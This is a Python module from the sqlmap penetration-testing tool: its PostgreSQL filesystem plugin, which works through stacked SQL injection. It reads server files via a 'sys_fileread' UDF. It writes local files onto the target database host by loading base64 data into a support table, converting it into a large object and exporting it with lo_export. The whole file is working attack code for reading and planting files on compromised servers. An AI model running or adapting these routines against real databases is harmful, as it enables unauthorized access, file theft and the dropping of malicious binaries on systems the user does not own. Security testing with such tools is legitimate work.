#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import os

from lib.core.common import randomInt
from lib.core.data import logger
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        self.oid = None

        GenericFilesystem.__init__(self)

    def unionReadFile(self, rFile):
        errMsg  = "PostgreSQL does not support file reading with UNION "
        errMsg += "query SQL injection technique"
        raise sqlmapUnsupportedFeatureException, errMsg

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        self.initEnv()

        return self.udfEvalCmd(cmd="'%s'" % rFile, udfName="sys_fileread")

    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        errMsg  = "PostgreSQL does not support file upload with UNION "
        errMsg += "query SQL injection technique"
        raise sqlmapUnsupportedFeatureException, errMsg

    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        wFileSize = os.path.getsize(wFile)

        if wFileSize > 8192:
            errMsg  = "on PostgreSQL it is not possible to write files "
            errMsg += "bigger than 8192 bytes at the moment"
            raise sqlmapUnsupportedFeatureException, errMsg

        self.oid = randomInt()

        debugMsg  = "creating a support table to write the base64 "
        debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "text")

        logger.debug("encoding file to its base64 string value")
        fcEncodedList = self.fileEncode(wFile, "base64", False)

        debugMsg  = "forging SQL statements to write the base64 "
        debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("inserting the base64 encoded file to the support table")

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg  = "create a new OID for a large object, it implicitly "
        debugMsg += "adds an entry in the large objects system table"
        logger.debug(debugMsg)

        # References:
        # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
        # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html
        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
        inject.goStacked("SELECT lo_create(%d)" % self.oid)

        debugMsg  = "updating the system large objects table assigning to "
        debugMsg += "the just created OID the binary (base64 decoded) UDF "
        debugMsg += "as data"
        logger.debug(debugMsg)

        # Refereces:
        # * http://www.postgresql.org/docs/8.3/interactive/catalog-pg-largeobject.html
        # * http://lab.lonerunners.net/blog/sqli-writing-files-to-disk-under-postgresql
        #
        # NOTE: From PostgreSQL site:
        #
        #   "The data stored in the large object will never be more than
        #   LOBLKSIZE bytes and might be less which is BLCKSZ/4, or
        #   typically 2 Kb"
        #
        # As a matter of facts it was possible to store correctly a file
        # large 13776 bytes, the problem arises at next step (lo_export())
        inject.goStacked("UPDATE pg_largeobject SET data=(DECODE((SELECT %s FROM %s), 'base64')) WHERE loid=%d" % (self.tblField, self.fileTblName, self.oid))

        debugMsg  = "exporting the OID %s file content to " % fileType
        debugMsg += "file '%s'" % dFile
        logger.debug(debugMsg)

        # NOTE: lo_export() exports up to only 8192 bytes of the file
        # (pg_largeobject 'data' field)
        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile), silent=True)

        if confirm:
            self.askCheckWrittenFile(wFile, dFile, fileType)

        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)